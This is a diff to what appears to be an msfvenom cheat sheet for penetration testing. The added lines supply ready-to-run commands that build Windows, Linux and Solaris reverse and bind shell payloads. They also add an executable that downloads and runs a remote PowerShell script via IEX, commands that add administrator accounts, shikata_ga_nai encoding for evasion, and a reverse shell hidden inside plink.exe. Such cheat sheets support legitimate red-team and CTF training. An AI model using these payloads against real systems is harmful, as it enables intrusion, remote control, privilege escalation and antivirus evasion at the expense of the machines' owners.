@@ -8,8 +8,6 @@ One can also use the -a to specify the architecture or the --platform
 <pre>msfvenom -l encoders #Encoders </pre>
 
 **Common params when creating a shellcode**
-
-PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 <pre> -b "\x00\x0a\x0d" </pre>
 <pre> -f c </pre>
 <pre> -e x86/shikata_ga_nai -i 5 </pre>
@@ -21,12 +19,31 @@ PrependSetuid=True #Use this to create a shellcode that will execute something w
 ---
 **Reverse Shell**
 <pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe </pre>
-**Bind Shell*
+**Bind Shell**
 <pre>msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe </pre>
 **Create User**
 <pre>msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe </pre>
 **CMD Shell*
 <pre> msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe </pre>
+**Execute Command**
+<pre> msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe </pre>
+<pre>msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe </pre>
+**Encoder**
+<pre>msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe </pre>
+**Embedded inside executable**
+<pre>msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe </pre>
+
+**Linux Payloads**
+---
+**Reverse Shell**
+<pre>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf </pre>
+<pre>msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf </pre>
+**Bind Shell**
+<pre>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf </pre>
+**SunOS (Solaris)**
+<pre>msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf </pre>
+<pre> </pre>
+<pre> </pre>
 <pre> </pre>
 <pre> </pre>
 <pre> </pre>
